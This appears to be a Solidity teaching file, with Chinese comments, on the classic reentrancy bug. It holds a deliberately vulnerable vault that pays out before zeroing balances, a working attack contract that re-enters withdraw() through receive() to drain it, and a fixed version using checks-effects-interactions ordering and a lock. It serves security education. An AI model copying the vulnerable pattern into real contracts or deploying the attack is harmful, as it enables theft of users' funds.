// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

/// @title VulnerableVault
/// @notice 受害合约 — 经典重入漏洞：先转账后更新状态
contract VulnerableVault {
    mapping(address => uint256) public balances;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() external {
        uint256 amt = balances[msg.sender];
        require(amt > 0, "nothing");

        // ① 先转账 ← 触发攻击者 receive()
        // slither-disable-next-line reentrancy-eth -- intentional: demo of classic reentrancy
        (bool ok,) = msg.sender.call{value: amt}("");
        require(ok);

        // ② 后更新状态 ← 已经太晚了
        balances[msg.sender] = 0;
    }
}

/// @title ClassicAttack
/// @notice 攻击合约 — 利用 receive() 重入 withdraw
contract ClassicAttack {
    VulnerableVault public vault;
    uint256 public count;

    constructor(address _vault) {
        vault = VulnerableVault(payable(_vault));
    }

    function attack() external payable {
        vault.deposit{value: msg.value}();
        vault.withdraw();
    }

    receive() external payable {
        if (count < 5 && address(vault).balance >= 1 ether) {
            count++;
            vault.withdraw();
        }
    }
}

/// @title SafeVault
/// @notice 修复版 — CEI 顺序 + Mutex
contract SafeVault {
    mapping(address => uint256) public balances;
    bool private locked;

    modifier nonReentrant() {
        require(!locked);
        locked = true;
        _;
        locked = false;
    }

    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() external nonReentrant {
        uint256 amt = balances[msg.sender];
        require(amt > 0, "nothing");
        balances[msg.sender] = 0; // ① 先更新状态
        (bool ok,) = msg.sender.call{value: amt}(""); // ② 再转账
        require(ok);
    }
}
